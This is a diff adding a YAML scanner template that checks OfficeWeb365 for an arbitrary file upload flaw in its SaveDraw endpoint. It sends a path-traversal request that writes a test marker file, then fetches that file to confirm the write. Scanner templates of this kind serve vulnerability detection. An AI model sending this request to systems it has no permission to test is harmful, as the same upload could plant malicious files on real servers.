@@ -1,0 +1,29 @@
+name: officeweb365-savedraw-upload
+set:
+  s1: randomInt(1000000,9999999)
+groups:
+  yesha1:
+    - method: GET
+      path: /PW/SaveDraw?path=../../Content/img&idx={{s1}}.txt
+      follow_redirects: false
+      headers:
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ASP.NET_SessionId=vayccioy4mobcb3mf5s5og2r
+      body: >-
+        data:image/png;base64,01s34567890123456789y12345678901234567m91<test123>}---
+      expression: >-
+        response.body.bcontains(b'ok')
+    - method: GET
+      path: /Content/img/UserDraw/drawPW{{s1}}.txt
+      follow_redirects: false
+      expression: >- 
+        response.body.bcontains(b'test123')  
+detail: 
+  links: 
+  authors:
+
+
